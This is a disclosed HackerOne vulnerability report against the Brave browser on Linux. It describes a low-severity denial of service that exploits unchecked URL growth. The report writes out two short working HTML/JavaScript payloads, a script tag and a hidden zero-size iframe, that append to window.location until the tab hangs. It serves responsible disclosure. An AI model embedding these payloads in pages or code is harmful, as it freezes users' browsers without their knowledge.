# [DOS] denial of service using code snippet on brave browser

## Report Details
- **Report ID**: 181558
- **URL**: https://hackerone.com/reports/181558
- **State**: Closed
- **Severity**: low
- **Submitted**: 2016-11-11T11:51:05.722Z
- **Disclosed**: 2018-05-06T20:57:55.812Z

## Reporter
- **Username**: tikoo_sahil
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: brave

## Vulnerability Information


## Summary:

brave browser hangs due to no validation  for  a  code snippet causing denial of service to users.

## Products affected: 
latest brave browser in linux

## Steps To Reproduce:

code snippet:-

1) <script>window.location+='?\u202a\uFEFF\u202b';</script> 

OR

2) <iframe style="width:0;height:0;border:0" src="data:text/html;charset=utf-8,<script>window.location+='?'+window.location.toString().split('');</script>">

Note :- both these issues have been fixed in google chrome and firefox gives some delay time to close tabs.

This is a variation of "a = a + a" that creates a very long URL. on my machine the 
renderer eventually is killed when the URL gets too large.

## Supporting Material/References:

i have attached both html files you can open them up and see browser hang.


## Attachments
- tt.html
- tt1.html
